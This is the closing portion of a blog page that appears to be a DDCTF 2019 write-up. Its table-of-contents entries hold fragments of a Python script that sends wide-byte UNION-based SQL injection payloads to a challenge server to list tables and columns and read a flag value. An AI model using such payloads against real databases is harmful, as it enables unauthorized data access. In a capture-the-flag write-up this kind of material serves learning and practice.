class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-TABLE-NAME-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,TABLE_NAME,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-information-schema-TABLES-where-TABLE-SCHEMA-0x6374666462-23’"><span class="toc-number"></span> <span class="toc-text">‘from information_schema.TABLES where TABLE_SCHEMA=0x6374666462 %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-2"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-COLUMN-NAME-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,COLUMN_NAME,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-information-schema-COLUMNS-where-TABLE-NAME-0x6374665F66686D4852504C35-23’"><span class="toc-number"></span> <span class="toc-text">‘from information_schema.COLUMNS where TABLE_NAME=0x6374665F66686D4852504C35 %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-3"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-ctf-value-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,ctf_value,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-ctfdb-ctf-fhmHRPL5-23’"><span class="toc-number"></span> <span class="toc-text">‘from ctfdb.ctf_fhmHRPL5 %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-requests-get-url-text"><span class="toc-number"></span> <span class="toc-text">print(requests.get(url).text)</span></a>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&text=DDCTF 2019 WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&is_video=false&description=DDCTF 2019 WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DDCTF 2019 WP&body=Check out this article: http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&name=DDCTF 2019 WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 1nv0k3r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-131778492-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?da32760b25f029bfe0c4abfc646f5f7a";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'blog-tw5j2p4htr';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


